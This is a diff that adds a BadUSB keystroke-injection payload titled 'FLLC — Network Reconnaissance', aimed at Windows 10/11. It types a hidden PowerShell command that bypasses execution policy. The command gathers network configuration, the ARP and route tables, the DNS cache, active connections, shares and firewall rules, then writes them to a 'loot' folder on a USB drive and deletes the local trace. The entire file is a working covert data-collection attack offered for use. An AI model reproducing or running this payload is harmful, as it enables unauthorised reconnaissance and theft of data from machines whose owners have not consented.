@@ -1,0 +1,12 @@
+REM ================================================
+REM  FLLC — Network Reconnaissance
+REM  Full network mapping: interfaces, ARP, routes,
+REM  DNS cache, active connections, shares, firewall.
+REM  Target: Windows 10/11 | Time: ~15 seconds
+REM ================================================
+
+DELAY 800
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -ep bypass -c "$h=hostname;$ts=Get-Date -f 'yyyyMMdd_HHmmss';$f=\"$env:TEMP\fllc_net_$ts.txt\";$r=@();$r+='FLLC NETWORK RECON';$r+=\"Host: $h | $ts\";$r+='='*50;$r+='';$r+='--- IPCONFIG ---';$r+=ipconfig /all 2>&1|Out-String;$r+='--- ARP TABLE ---';$r+=arp -a 2>&1|Out-String;$r+='--- ROUTE TABLE ---';$r+=route print 2>&1|Out-String;$r+='--- DNS CACHE ---';$r+=ipconfig /displaydns 2>&1|Out-String;$r+='--- ACTIVE CONNECTIONS ---';$r+=netstat -ano 2>&1|Out-String;$r+='--- NET SHARES ---';$r+=net share 2>&1|Out-String;$r+='--- NET VIEW ---';try{$r+=net view 2>&1|Out-String}catch{$r+='(unavailable)'};$r+='--- FIREWALL STATUS ---';$r+=netsh advfirewall show allprofiles state 2>&1|Out-String;$r+='--- FIREWALL RULES (ALLOW) ---';$r+=netsh advfirewall firewall show rule name=all dir=in|Select-String 'Rule Name|Enabled|Action|LocalPort'|Out-String;$r|Out-File $f -Encoding UTF8;$usb=(Get-WmiObject Win32_LogicalDisk|?{$_.DriveType -eq 2}|Select -First 1).DeviceID;if($usb){$ld=\"$usb\loot\";New-Item -ItemType Directory -Path $ld -Force|Out-Null;Copy-Item $f \"$ld\netrecon_$($h)_$ts.txt\" -Force};Remove-Item $f -Force"
+ENTER
